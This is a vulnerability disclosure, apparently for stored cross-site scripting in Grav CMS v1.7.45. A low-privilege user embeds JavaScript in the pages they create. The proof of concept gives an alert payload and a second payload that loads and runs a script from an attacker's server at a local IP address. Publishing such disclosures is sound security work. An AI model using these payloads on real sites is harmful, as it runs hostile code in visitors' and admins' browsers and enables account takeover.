
# Description

## Summary
This vulnerability allows users with restricted page creation privileges to insert harmful JavaScript code into the pages they create, potentially compromising the system. To mitigate this risk, robust input validation and content filtering measures must be implemented to prevent the execution of unauthorized scripts and ensure system security.

## Details

### The following image shows the attacker privileges.
![327075359-a202a1ff-9284-468a-9d20-233e69909a0b](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/9cd780d3-e215-4536-bd5e-b68a0294623f)

### The following image shows the this user dont have the privilege to add the java script according to the admin
![327075618-941c466b-dd56-4063-a021-fb2c1eeb0692](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/79e2a9f6-9eea-4bff-ab57-e15292bb4f3e)

The following image shows the version number.

![327076118-9e233df3-97fd-44a9-af03-991b8e3c983f](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/efbbd2cb-ceaa-4f68-8773-364f671be9ec)

# PoC

step 1: Login into the user account.

![327076440-1ecf060f-35ee-4243-bfd3-59fa4e78e6c5](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/90866c9a-4d0a-4f6b-aaa0-beff84bd7afa)

Step 2: Create the page with ```<a ondblclick='alert(1)'><h1>test</h1></a>``` as shown in the picture.

![327076980-2fc4d7b5-e76f-43d2-bbfc-edfd0546fe22](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/0034aa13-2fd5-4087-8f06-0b7f8f57f5ba)

Step 3: Navigate to the created page and double click on the link and note the XSS popup.

![327077249-c6b12696-f6a6-482b-9a0b-0161bca69ff8](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/9cc2a8ac-09e5-4e8a-973b-17275eeba7e8)

Step 4: Loading and XSS payload from the third party. with the following payload.

```<a ondblclick='var s=document.createElement("script");s.src="http://192.168.86.129:9000/test.js";s.onerror=()=>console.error("Error loading script!");document.head.appendChild(s);'><h1>test</h1></a>```

![327077813-cc951bd0-99ff-4fed-88e8-ec93eb424944](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/5e31b1c7-b43b-47d8-ab62-cdc76cee2793)

Step 5: The following image shows after loaded and executed code.
![327078575-f80dd09f-5b29-45b7-adcc-f2bb4860198d](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/2c8c8621-e8fe-435d-ac67-1fee3a35d26a)

Step 6: The following image shows the code loaded and executed from the attackers server.
![327078751-e3f6ef0c-5b9b-45a9-b97f-2a59899b7e88](https://github.com/r4vanan/Stored-xss-Grav-v1.7.45-/assets/35825039/839c24d1-25b5-4a17-bd7c-d875f0318f11)

# Impact

## Affected by every users every user who visits site and even admin.
## Tested with following requirements

    * PHP 8.2.12 (cli) (built: Jan 8 2024 06:21:20) (NTS)
    * Grav v1.7.45
    * kalilinux




